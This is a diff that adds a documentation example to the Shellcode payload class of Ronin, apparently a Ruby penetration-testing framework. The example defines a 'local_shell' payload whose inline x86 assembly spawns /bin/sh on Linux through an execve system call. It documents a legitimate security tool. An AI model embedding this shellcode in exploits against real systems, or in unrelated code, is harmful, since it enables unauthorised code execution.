@@ -28,6 +28,41 @@ module Ronin
     # A {Payload} class that represents payloads written in assembly which
     # spawn shells or run commands.
     #
+    # ## Example
+    #
+    #     #!/usr/bin/env ronin-payload -f
+    #     
+    #     require 'ronin/payloads/shellcode'
+    #     
+    #     Ronin::Payloads::Shellcode.object do
+    #     
+    #       cache do
+    #         self.name = 'local_shell'
+    #         self.description = %{
+    #           Shellcode that spawns a local /bin/sh shell
+    #         }
+    #     
+    #         targets_arch :x86
+    #         targets_os   :linux
+    #       end
+    #     
+    #       build do
+    #         shellcode do
+    #           xor   eax, eax
+    #           push  eax
+    #           push  0x68732f2f
+    #           push  0x6e69622f
+    #           mov   esp, ebx
+    #           push  eax
+    #           push  ebx
+    #           mov   esp, ecx
+    #           xor   edx, edx
+    #           int   0xb
+    #         end
+    #       end
+    #     
+    #     end
+    #
     class Shellcode < ASMPayload
 
       protected
